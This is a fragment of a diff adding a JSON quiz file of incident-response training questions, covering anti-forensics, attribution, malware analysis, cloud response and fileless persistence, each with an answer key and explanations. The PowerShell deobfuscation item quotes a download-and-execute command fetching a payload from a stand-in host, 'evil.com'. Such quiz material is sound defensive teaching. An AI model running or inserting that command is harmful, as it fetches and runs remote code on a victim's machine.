+          "Threat actor attribution",
+          "Indicator of Compromise (IoC) enrichment"
+        ],
+        "correct": 1,
+        "explanation": "✓ The decision is a direct trade-off based on the volatility of evidence. Pulling the plug preserves the state of the hard disk more accurately (less data is overwritten) but destroys the highly volatile data in RAM. A graceful shutdown preserves file system integrity but destroys RAM and overwrites many logs and temporary files during the shutdown process. The choice depends on what evidence is deemed most critical for the investigation.\n✗ Chain of custody is about tracking evidence after collection. Attribution is about identifying the attacker.",
+        "learningPoints": [
+          "The method of shutting down a system has significant forensic implications.",
+          "A graceful shutdown alters disk evidence but allows for a clean shutdown.",
+          "Pulling the power plug preserves disk evidence but destroys memory evidence and risks file system corruption."
+        ],
+        "sources": [
+          "https://www.sans.org/blog/live-response-or-pull-the-plug-a-major-incident-response-crossroad/"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      }
+    ],
+    "incident-response_advanced": [
+      {
+        "title": "Anti-Forensics Techniques",
+        "context": "During a forensic investigation of a compromised Linux server, an analyst discovers that the attacker used the `shred` command to overwrite deleted files and also manipulated file timestamps using the `touch` command to blend malicious files in with legitimate system files.",
+        "question": "What are these actions by the attacker collectively known as?",
+        "options": [
+          "Reconnaissance",
+          "Persistence",
+          "Anti-forensics",
+          "Lateral movement"
+        ],
+        "correct": 2,
+        "explanation": "✓ Anti-forensics consists of techniques used by attackers to frustrate forensic investigations. This includes securely deleting data to prevent recovery (data hiding/wiping), modifying timestamps to confuse timeline analysis (artifact wiping), encrypting data, or using rootkits to modify the operating system to hide their presence. The goal is to destroy or hide evidence of their activities.\n✗ The other options are different stages or tactics in an attack, as defined by frameworks like ATT&CK.",
+        "learningPoints": [
+          "Anti-forensics techniques are designed to impede forensic analysis.",
+          "Common methods include data wiping, timestamp manipulation, and data obfuscation.",
+          "Investigators must be aware of these techniques to recognize when evidence has been tampered with."
+        ],
+        "sources": [
+          "https://www.sciencedirect.com/topics/computer-science/anti-forensics"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Threat Actor Attribution",
+        "context": "After analyzing an intrusion, a threat intelligence team reports with 'moderate confidence' that the attack was conducted by APT28. Their conclusion is based on the use of specific malware tools known to be unique to that group, the targeting of a political organization, and overlaps in command-and-control infrastructure with previous APT28 campaigns.",
+        "question": "What is this process of identifying the likely adversary behind an attack called?",
+        "options": [
+          "Vulnerability analysis",
+          "Threat actor attribution",
+          "Incident triage",
+          "Malware sandboxing"
+        ],
+        "correct": 1,
+        "explanation": "✓ Threat actor attribution is the process of assigning responsibility for a cyber attack to a specific individual or group. It is a complex analytical process that rarely results in 100% certainty. Analysts use multiple data points, including the attacker's TTPs (Tactics, Techniques, and Procedures), tools, infrastructure, and motivations, to build a case for attribution.\n✗ The other options are different, more technical processes within security operations.",
+        "learningPoints": [
+          "Attribution is the process of identifying the actor behind an attack.",
+          "It is based on a collection of evidence, including TTPs, malware, infrastructure, and intent.",
+          "Attribution is often stated with a confidence level (e.g., low, medium, high) due to the potential for deception."
+        ],
+        "sources": [
+          "https://www.crowdstrike.com/cybersecurity-101/threat-intelligence/cyber-attribution/"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Static vs. Dynamic Malware Analysis",
+        "context": "A malware analyst has a malicious executable file. First, they use a disassembler and a string-searching tool to examine the file without running it. Next, they execute the file in a sandboxed virtual machine to observe its behavior, such as the network connections it makes and the registry keys it creates.",
+        "question": "What two types of malware analysis are being performed, in order?",
+        "options": [
+          "Both are static analysis.",
+          "Static analysis, then dynamic analysis.",
+          "Dynamic analysis, then static analysis.",
+          "Both are dynamic analysis."
+        ],
+        "correct": 1,
+        "explanation": "✓ Static analysis involves examining a malware sample without executing it. This includes activities like analyzing its code in a disassembler, looking for strings, and checking the file header. Dynamic analysis involves running the malware in a controlled environment (a sandbox) to observe its behavior in real-time. The analyst performed static analysis first, followed by dynamic analysis.\n✗ The analyst clearly performed both types, in the specified order.",
+        "learningPoints": [
+          "Static malware analysis examines the file without running it.",
+          "Dynamic malware analysis observes the file's behavior during execution in a sandbox.",
+          "A comprehensive analysis typically involves both techniques."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/products/security/what-is-malware-analysis.html"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Cloud Incident Response",
+        "context": "A company's security team is alerted to suspicious activity in their AWS account. They discover that an attacker has compromised an IAM user's access keys and is using them to create new EC2 instances. The team's traditional on-premises forensic tools are not useful here.",
+        "question": "What is the most critical first containment step in this cloud-based incident?",
+        "options": [
+          "Image the hard drives of the company's on-premises servers.",
+          "Call the local police department.",
+          "Revoke the compromised IAM access keys and investigate CloudTrail logs.",
+          "Run an antivirus scan on the new EC2 instances."
+        ],
+        "correct": 2,
+        "explanation": "✓ In a cloud environment, identity is the new perimeter. When IAM credentials are compromised, the immediate priority is to revoke them to lock the attacker out of the account. The next step is to analyze the cloud provider's logs (like AWS CloudTrail) to determine every action the attacker took with those keys. On-premises tools and procedures are often irrelevant in cloud-native incidents.\n✗ On-premise actions are irrelevant. Antivirus scans are secondary to revoking the attacker's access.",
+        "learningPoints": [
+          "Cloud incident response requires different tools and procedures than on-premises IR.",
+          "Identity and Access Management (IAM) is a critical control plane in the cloud.",
+          "The first step in a credential compromise is to revoke the compromised credentials."
+        ],
+        "sources": [
+          "https://aws.amazon.com/blogs/security/how-to-approach-incident-response-in-the-cloud/"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "PowerShell Deobfuscation",
+        "context": "An incident responder finds the following PowerShell command executed on a host: `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')`. The attacker then used multiple layers of Base64 and string replacement to hide their subsequent commands.",
+        "question": "What skill is essential for the incident responder to understand what the attacker did next?",
+        "options": [
+          "Hardware reverse engineering",
+          "PowerShell deobfuscation",
+          "Vulnerability scanning",
+          "Firewall rule configuration"
+        ],
+        "correct": 1,
+        "explanation": "✓ Attackers frequently use multiple layers of obfuscation (like Base64 encoding, string concatenation, and compression) to hide their PowerShell scripts from simple signature-based detection. A critical skill for an advanced incident responder is PowerShell deobfuscation: the ability to manually or with tools peel back these layers of obfuscation to reveal the original, malicious code and understand the attacker's actions.\n✗ The problem is not about hardware, vulnerabilities, or firewalls, but about understanding the obfuscated script.",
+        "learningPoints": [
+          "Attackers heavily obfuscate PowerShell to evade detection.",
+          "Deobfuscation is the process of reversing the obfuscation to reveal the clear-text script.",
+          "This is a critical skill for analyzing modern 'living off the land' attacks."
+        ],
+        "sources": [
+          "https://www.sans.org/blog/powershell-obfuscation-detection-with-the-right-script-logging/"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Threat Hunting Maturity Model",
+        "context": "An organization's SOC currently only responds to alerts generated by their SIEM (Level 1). They want to improve their capabilities to a level where they can proactively search for threats based on external threat intelligence and create their own data analysis procedures (Level 3 or 4).",
+        "question": "What concept describes this progression of proactive threat detection capabilities?",
+        "options": [
+          "The Cyber Kill Chain",
+          "The Threat Hunting Maturity Model",
+          "The Order of Volatility",
+          "The VERIS Framework"
+        ],
+        "correct": 1,
+        "explanation": "✓ The Threat Hunting Maturity Model is a framework for assessing an organization's proactive defense capabilities. It typically ranges from Level 0 (relying purely on automated alerting) to higher levels involving structured, repeatable, and automated threat hunts driven by data analysis and threat intelligence. It provides a roadmap for organizations to improve their ability to find previously undetected threats.\n✗ The other options are models for attack stages, evidence collection, and incident classification, not for measuring defensive maturity.",
+        "learningPoints": [
+          "The Threat Hunting Maturity Model helps organizations assess and improve their proactive detection capabilities.",
+          "Maturity levels progress from purely reactive alerting to automated, intelligence-driven hunting.",
+          "Higher levels of maturity require significant investment in data collection, tooling, and analyst skills."
+        ],
+        "sources": [
+          "https://www.varonis.com/blog/threat-hunting-maturity-model"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Counter-Deception Strategy",
+        "context": "A security team has detected an attacker interacting with a honeypot. Instead of immediately blocking the attacker, the team allows the interaction to continue while they feed the attacker manipulated, non-critical data. The goal is to waste the attacker's time and learn about their tools and intent.",
+        "question": "What is this proactive defense strategy of engaging with and misleading an attacker called?",
+        "options": [
+          "Penetration testing",
+          "Vulnerability scanning",
+          "Counter-deception or Active Defense",
+          "Incident eradication"
+        ],
+        "correct": 2,
+        "explanation": "✓ This goes beyond simple deception (like a honeypot) and into the realm of counter-deception or Active Defense. The goal is not just to detect the attacker, but to actively engage with them in a controlled environment to learn as much as possible about them, mislead them about the real network environment, and increase their operational cost and risk. This is a highly advanced and resource-intensive defensive strategy.\n✗ This is a defensive action, not a form of testing or eradication.",
+        "learningPoints": [
+          "Counter-deception is a proactive strategy to engage and mislead attackers.",
+          "It aims to gather intelligence and increase the attacker's cost of operations.",
+          "This is a very mature defense capability that carries its own risks and requires significant expertise."
+        ],
+        "sources": [
+          "https://www.sans.org/cyber-security-courses/active-defense-cyber-deception/"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Enterprise-Wide Eradication",
+        "context": "Following a widespread APT compromise, an incident response team plans a single, coordinated action to remove the adversary from the network. This involves simultaneously revoking all compromised credentials, patching all exploited vulnerabilities, and disabling all known C2 channels at a specific, predetermined time.",
+        "question": "What is the primary reason for this coordinated, simultaneous eradication event?",
+        "options": [
+          "To minimize the cost of the response.",
+          "To allow the team to go home early.",
+          "To prevent the attacker from detecting the response and using their backup access methods to maintain persistence.",
+          "To ensure all systems are rebooted at the same time."
+        ],
+        "correct": 2,
+        "explanation": "✓ Advanced adversaries often have multiple persistence mechanisms and C2 channels. If a defender cleans up one compromised machine or blocks one C2 channel, the attacker will notice and immediately use their other access points to burrow deeper or change their TTPs. A coordinated, enterprise-wide eradication event aims to remove all of the attacker's known footholds at once, giving them no time to react and re-establish persistence.\n✗ This is a complex and high-stress operation, not a cost-saving or time-saving measure.",
+        "learningPoints": [
+          "Eradicating an APT requires a coordinated, decisive action.",
+          "The goal is to remove all attacker footholds simultaneously.",
+          "A piecemeal cleanup effort is likely to fail against a sophisticated adversary."
+        ],
+        "sources": [
+          "https://www.mandiant.com/resources/blog/insights-into-incident-response-for-apts"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Indicator of Compromise (IoC) vs. Indicator of Attack (IoA)",
+        "context": "A SOC analyst is reviewing two types of alerts. Alert 1 is 'File with hash 5f4d... was found', which is a known piece of malware. Alert 2 is 'A process opened a handle to lsass.exe and created a remote thread', indicating a credential dumping technique in progress.",
+        "question": "How would you classify these two alerts?",
+        "options": [
+          "Both are IoCs.",
+          "Alert 1 is an IoC (Indicator of Compromise), Alert 2 is an IoA (Indicator of Attack).",
+          "Alert 1 is an IoA, Alert 2 is an IoC.",
+          "Both are IoAs."
+        ],
+        "correct": 1,
+        "explanation": "✓ An Indicator of Compromise (IoC) is a piece of forensic evidence that indicates a compromise has already happened (e.g., a file hash, a malicious IP). It is reactive. An Indicator of Attack (IoA) focuses on the adversary's actions and intentions, describing the sequence of events in a potential attack (e.g., code execution in lsass.exe). IoAs are proactive and aim to detect an attack while it is still in progress, regardless of the specific malware or tool used.\n✗ The file hash is a piece of static, after-the-fact evidence (IoC), while the process behavior is an active, in-progress action (IoA).",
+        "learningPoints": [
+          "IoCs are reactive evidence of a past compromise (the 'what').",
+          "IoAs are proactive indicators of an ongoing attack based on behavior (the 'how').",
+          "Modern security tools like EDR focus heavily on detecting IoAs."
+        ],
+        "sources": [
+          "https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioc-vs-ioa/"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Fileless Malware Persistence",
+        "context": "An incident responder is analyzing a compromised machine. They can find no malicious files on the disk, but they notice that every time the system reboots, a malicious PowerShell process is launched. Further investigation reveals a new entry in the Windows Registry's `Run` key that contains a long, obfuscated PowerShell command.",
+        "question": "What is this an example of?",
+        "options": [
+          "A bootkit infection.",
+          "A fileless malware attack using a registry-based persistence mechanism.",
+          "A network worm spreading via SMB.",
+          "A traditional file-based virus."
+        ],
+        "correct": 1,
+        "explanation": "✓ Fileless malware aims to operate without writing malicious executables to disk, making it harder for traditional AV to detect. However, to survive a reboot, it needs a persistence mechanism. A common technique is to store the malicious script or command directly in the Windows Registry in keys that are automatically executed at startup (like the `Run` keys). This allows the 'fileless' malware to re-launch itself after a reboot.\n✗ This is a specific persistence technique. A bootkit infects the master boot record. A worm is about propagation. A file-based virus would have a malicious file on disk.",
+        "learningPoints": [
+          "Fileless malware still requires a method to achieve persistence.",
+          "Common persistence techniques include using registry run keys, scheduled tasks, and WMI event subscriptions.",
+          "Detecting these attacks requires monitoring these common persistence locations for suspicious entries."
+        ],
+        "sources": [
+          "https://attack.mitre.org/techniques/T1547/001/"
+        ],
+        "difficulty": "advanced",
+        "domain": "incident-response"
+      }
+    ]
+  }
+}
